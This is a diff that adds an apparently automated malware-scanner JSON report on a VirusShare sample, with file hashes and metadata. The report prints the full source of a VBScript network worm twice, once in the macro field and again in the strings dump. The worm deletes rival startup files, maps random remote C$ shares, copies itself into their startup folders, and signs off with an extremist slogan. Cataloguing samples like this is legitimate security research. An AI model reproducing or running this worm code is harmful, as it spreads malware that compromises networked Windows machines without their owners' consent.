@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "copyfile": "May copy a file",
+            "createobject": "May create an OLE object",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "set t=wscript.createobject(\"wscript.network\")\nset f=createobject(\"scripting.filesystemobject\")\non error resume next\nrandomize\ndo\ndo while w=0\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.exe\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.exe\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\a.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\a.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\little.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\little.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\prince.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\prince.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\MS StartUp Config.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\MS StartUp Config.exe\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\_a.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\_a.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\_b.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\_b.vbs\")\n\nn=\"\\\\216.\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\"\\C\"\nt.mapnetworkdrive \"x:\",n\nset o=t.enumnetworkdrives\nfor i=0 to o.Count-1\nif n=o.item(i) then w=1\nnext\nloop\nf.copyfile \"c:\\windows\\startm~1\\programs\\startup\\_.vbs\", \"x:\\windows\\startm~1\\programs\\startup\\\"\nf.copyfile \"c:\\windows\\startm~1\\programs\\startup\\_.exe\", \"x:\\windows\\startm~1\\programs\\startup\\\"\nt.removenetworkdrive \"x:\"\nw=0\nloop\n'Viva Bin Laden!"
+    },
+    "filename": "VirusShare_388ca9c4c615c87f6c5270c9a79b81f6",
+    "filesize": 2103,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "388ca9c4c615c87f6c5270c9a79b81f6",
+        "sha1": "6f54c309cc624f14cc34a87fca87de04d44d2c61",
+        "sha256": "22afb9041aa9b2e05e01905ce9e864ad2865804ef4a4d4ca038a186116f1aba3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "set t=wscript.createobject(\"wscript.network\")",
+            "set f=createobject(\"scripting.filesystemobject\")",
+            "on error resume next",
+            "randomize",
+            "do while w=0",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.exe\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.exe\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\mscfg.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\a.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\a.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\little.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\little.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\prince.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\prince.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\MS StartUp Config.exe\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\MS StartUp Config.exe\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\_a.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\_a.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\_b.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\_b.vbs\")",
+            "n=\"\\\\216.\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\"\\C\"",
+            "t.mapnetworkdrive \"x:\",n",
+            "set o=t.enumnetworkdrives",
+            "for i=0 to o.Count-1",
+            "if n=o.item(i) then w=1",
+            "next",
+            "loop",
+            "f.copyfile \"c:\\windows\\startm~1\\programs\\startup\\_.vbs\", \"x:\\windows\\startm~1\\programs\\startup\\\"",
+            "f.copyfile \"c:\\windows\\startm~1\\programs\\startup\\_.exe\", \"x:\\windows\\startm~1\\programs\\startup\\\"",
+            "t.removenetworkdrive \"x:\"",
+            "loop",
+            "'Viva Bin Laden!"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.284151",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
